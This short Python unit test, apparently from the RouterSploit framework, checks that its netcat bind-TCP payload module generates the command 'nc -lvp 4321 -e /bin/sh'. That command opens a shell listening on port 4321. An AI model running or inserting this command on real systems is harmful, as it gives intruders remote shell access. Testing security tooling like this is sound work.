from routersploit.modules.payloads.cmd.netcat_bind_tcp import Payload


# netcat bind tcp payload with rport=4321
bind_tcp = (
    "nc -lvp 4321 -e /bin/sh"
)


def test_payload_generation():
    """ Test scenario - payload generation """

    payload = Payload()
    payload.rport = 4321

    assert payload.run() == bind_tcp
